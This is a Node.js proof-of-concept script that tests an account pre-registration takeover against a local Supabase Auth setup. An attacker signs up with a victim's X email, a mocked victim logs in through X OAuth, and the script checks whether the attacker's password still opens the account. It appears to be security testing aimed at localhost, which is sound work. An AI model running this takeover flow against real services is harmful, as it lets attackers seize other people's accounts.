// Pre-registration attack: attacker signs up with the victim's X email first; victim then logs in with X.
const { AuthClient } = require("@supabase/supabase-js");
const { execFileSync } = require("child_process");
const keys = require("./keys.json");
const URL_ = "http://localhost:9999";
const nc = (key) => new AuthClient({ url: URL_, headers: { apikey: key, Authorization: `Bearer ${key}` }, autoRefreshToken: false, persistSession: false, detectSessionInUrl: false, flowType: "implicit" });
const admin = nc(keys.service);
const psql = (sql) => execFileSync("docker", ["exec", "sb-db", "psql", "-U", "supabase_admin", "-h", "localhost", "-d", "postgres", "-tA", "-F", " | ", "-c", sql], { encoding: "utf8", env: { ...process.env, MSYS_NO_PATHCONV: "1" } }).trim();
const say = (k, v) => console.log(k.padEnd(52), typeof v === "string" ? v : JSON.stringify(v));
async function loginWithX() {
  const c = nc(keys.anon);
  const { data, error } = await c.signInWithOAuth({ provider: "x", options: { skipBrowserRedirect: true, redirectTo: "http://localhost:3000/cb" } });
  if (error) throw error;
  let url = data.url;
  for (let i = 0; i < 8; i++) {
    const r = await fetch(url.replace("host.docker.internal", "localhost"), { redirect: "manual" });
    const loc = r.headers.get("location"); if (!loc) throw new Error("no redirect " + r.status);
    if (loc.startsWith("http://localhost:3000/cb")) { const p = new URLSearchParams(loc.split("#")[1] || loc.split("?")[1] || ""); return p.get("error") ? { error: `${p.get("error")}: ${p.get("error_description")}` } : { jwt: p.get("access_token") }; }
    url = new URL(loc, url).toString();
  }
}
const xId = async (jwt) => { const { data, error } = await admin.getUser(jwt); if (error) return "ERR " + error.message; const x = (data.user.identities || []).filter((i) => i.provider === "x"); return x.length === 1 ? "x id " + x[0].id : `no single x identity (providers: ${(data.user.identities || []).map((i) => i.provider)})`; };
(async () => {
  const email = process.argv[2] || "victim2@example.com";
  await fetch("http://localhost:4010/__set", { method: "POST", body: JSON.stringify({ id: "777000222", username: "Victim_Two", confirmed_email: email }) });
  const pre = await nc(keys.anon).signUp({ email, password: "Passw0rd!123456" });
  say("attacker signUp(victim email)", pre.error ? `REFUSED: ${pre.error.message}` : `ok (session=${!!pre.data.session}, confirmed=${!!pre.data.user?.email_confirmed_at})`);
  const early = await nc(keys.anon).signInWithPassword({ email, password: "Passw0rd!123456" });
  say("attacker password login BEFORE victim logs in", early.error ? `refused: ${early.error.message}` : "ok");
  const v = await loginWithX();
  say("victim logs in with X", v.error ? `ERROR ${v.error}` : "ok");
  say("auth.users rows for that email", psql(`select count(*) from auth.users where email='${email}'`));
  const atk = await nc(keys.anon).signInWithPassword({ email, password: "Passw0rd!123456" });
  say("attacker password login AFTER victim logged in", atk.error ? `refused: ${atk.error.message}` : "ok");
  if (atk.data?.session) say("  Edge check on attacker's JWT", await xId(atk.data.session.access_token));
  else say("  attacker has no session", "n/a");
  say("identities on that email's user(s)", psql(`select string_agg(i.provider||':'||i.provider_id, ', ') from auth.identities i join auth.users u on u.id=i.user_id where u.email='${email}'`) || "(none)");
})().catch((e) => { console.error("ERR", e.message); process.exit(1); });
